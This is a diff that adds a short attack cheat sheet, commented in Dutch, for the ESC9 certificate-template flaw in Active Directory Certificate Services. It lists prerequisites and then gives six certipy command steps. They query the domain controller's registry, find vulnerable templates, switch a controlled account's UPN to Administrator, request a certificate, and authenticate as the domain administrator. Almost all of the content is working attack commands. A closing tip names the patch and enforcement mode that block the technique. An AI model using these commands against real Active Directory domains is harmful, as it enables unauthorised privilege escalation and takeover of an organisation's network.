@@ -1,0 +1,24 @@
+# AD CS ESC9 - No Security Extension (CT_FLAG_NO_SECURITY_EXTENSION / szOID_NTDS_CA_SECURITY_EXT)
+# Template heeft msPKI-Enrollment-Flag met CT_FLAG_NO_SECURITY_EXTENSION
+# Hierdoor bevat het certificaat geen szOID_NTDS_CA_SECURITY_EXT OID
+# In combinatie met StrongCertificateBindingEnforcement=1 (default) → account mapping bypass
+# Vereisten:
+# - StrongCertificateBindingEnforcement != 2 (registry op DC)
+# - Template met CT_FLAG_NO_SECURITY_EXTENSION
+# - Template staat Client Authentication toe
+# - Aanvaller heeft GenericWrite op een ander account
+# Stap 1: Check registry op DC
+reg query "HKLM\SYSTEM\CurrentControlSet\Services\Kdc" /v StrongCertificateBindingEnforcement
+# Waarde 0 of 1 = kwetsbaar, 2 = niet kwetsbaar
+# Stap 2: Vind template met NO_SECURITY_EXTENSION
+certipy find -u user@domain.local -p Password123! -dc-ip DC_IP -vulnerable
+# Stap 3: Wijzig de UPN van een gecontroleerd account naar die van het target
+certipy account update -u user@domain.local -p Password123! -user controlled_account -upn Administrator
+# Stap 4: Request certificaat als het gecontroleerde account
+certipy req -u controlled_account@domain.local -p Password123! -ca domain-CA -target dc01.domain.local -template TemplateName
+# Stap 5: Zet UPN terug
+certipy account update -u user@domain.local -p Password123! -user controlled_account -upn controlled_account@domain.local
+# Stap 6: Authenticate met certificaat — wordt gemapt op Administrator
+certipy auth -pfx controlled_account.pfx -domain domain.local -dc-ip DC_IP
+# Tip: ESC9 vereist GenericWrite op een account + specifieke template flag
+# Tip: Na KB5014754 met enforcement mode 2 werkt dit niet meer
